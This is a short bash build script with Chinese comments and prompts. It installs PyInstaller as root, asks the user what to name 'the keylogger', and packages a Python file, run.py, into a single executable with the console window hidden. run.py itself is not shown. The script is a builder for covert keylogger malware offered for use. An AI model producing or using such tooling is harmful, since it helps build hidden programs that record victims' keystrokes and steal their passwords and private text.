#!/usr/bin/env bash
################################################

# 确保脚本以适当的权限运行
if [[ "$EUID" -ne 0 ]]; then
    echo "请使用 root 权限或 sudo 来安装软件包。"
    exit 1
fi

# 安装 pyinstaller（显示详细输出）
echo "正在安装 pyinstaller..."
pip3 install pyinstaller -v

# 检查安装是否成功
if [[ $? -ne 0 ]]; then
    echo "安装 pyinstaller 失败。正在退出。"
    exit 1
fi

# 提示用户输入键盘记录器的名称
read -p "请输入您想要给键盘记录器起的名字: " name

# 验证用户输入
if [[ -z "$name" ]]; then
    echo "未提供名称。正在退出。"
    exit 1
fi

# 使用 PyInstaller 创建可执行文件
echo "正在使用 PyInstaller 创建可执行文件..."
pyinstaller --onefile --name "$name" --noconsole run.py

# 检查 PyInstaller 是否成功
if [[ $? -eq 0 ]]; then
    echo "可执行文件创建成功。"
else
    echo "创建可执行文件失败。请检查 PyInstaller 的输出以了解错误详情。"
    exit 1
fi
